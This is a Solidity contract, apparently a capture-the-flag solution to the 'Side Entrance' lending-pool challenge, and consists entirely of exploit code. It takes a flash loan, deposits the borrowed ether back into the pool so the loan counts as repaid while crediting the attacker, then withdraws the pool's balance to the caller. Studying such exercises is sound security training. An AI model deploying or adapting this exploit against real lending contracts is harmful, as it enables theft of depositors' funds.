pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol"; 
import "@openzeppelin/contracts/utils/Address.sol";


contract HackerReceiver {
    using Address for address payable;

    address payable public pool;

    constructor(address payable _pool) public {
      pool = _pool;
    }

    function hack(uint256 amount) external {
      SideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        uint256 amount = msg.value;
        SideEntranceLenderPool(pool).deposit{value: amount}();
    }

    function withdraw() external {
        SideEntranceLenderPool(pool).withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    receive () external payable {}
}
